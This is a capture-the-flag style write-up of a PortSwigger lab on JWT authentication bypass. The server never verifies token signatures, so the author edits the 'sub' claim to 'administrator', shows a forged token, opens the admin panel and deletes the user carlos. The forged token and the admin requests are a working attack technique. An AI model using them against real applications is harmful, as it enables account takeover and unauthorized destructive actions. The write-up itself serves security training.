### Token Analysis

After logging in using the default credentials, the session cookie contains a JWT.

Decoded JWT header:

```json
{
  "kid": "dc2eb777-08d6-47b2-8c6b-4e41bc33155c",
  "alg": "RS256"
}
```

Decoded JWT payload:

```json
{
  "iss": "portswigger",
  "exp": 1770309586,
  "sub": "wiener"
}
```

Key observation:

- The `sub` (subject) claim represents the **logged-in user**
- The application relies on this value for authorization
- The `alg` is set to `RS256`, but **the signature is never verified**

---

### Initial Authorization Check

Accessing the admin panel with the original token:

```
GET /admin
```

Response:

```
Admin interface only available if logged in as an administrator
```

This confirms:
- Authorization is role/identity-based
- The application trusts the JWT to determine admin access

---

### Exploitation Strategy

Since the server does **not verify JWT signatures**, we can:
1. Modify the `sub` claim
2. Keep the JWT structure intact
3. Send the tampered token without a valid signature

The goal is to impersonate an administrator.

---

### Modified JWT Payload

We change the `sub` value to `administrator`:

```json
{
  "iss": "portswigger",
  "exp": 1770309586,
  "sub": "administrator"
}
```

Re-encoded JWT (signature can be invalid or garbage):

```jwt
eyJraWQiOiJkYzJlYjc3Ny0wOGQ2LTQ3YjItOGM2Yi00ZTQxYmMzMzE1NWMiLCJhbGciOiJSUzI1NiJ9
.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MDMwOTU4Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9
.Jx7UEAoosamU8F8WyZlrY0kSNeb8kONO6J9aunHTvxhvhx1XHXO8cftBnyzs40u6jxbEmTckgBXYjd2_L
```

Because the application **does not validate the signature**, the token is accepted as legitimate.

---

### Admin Access Confirmation

Using the modified JWT:

```
GET /admin
```

Result:
- Admin panel is now accessible
- Confirms successful authentication bypass

---

### Privilege Abuse

From the admin panel, we identify the user deletion endpoint:

```
/admin/delete?username=carlos
```

Sending this request with the forged admin JWT successfully deletes the user `carlos`.

---

### Result

- Authentication bypass achieved via **JWT signature verification failure**
- Privilege escalation from normal user to administrator
- Unauthorized administrative action performed
- Lab completed successfully

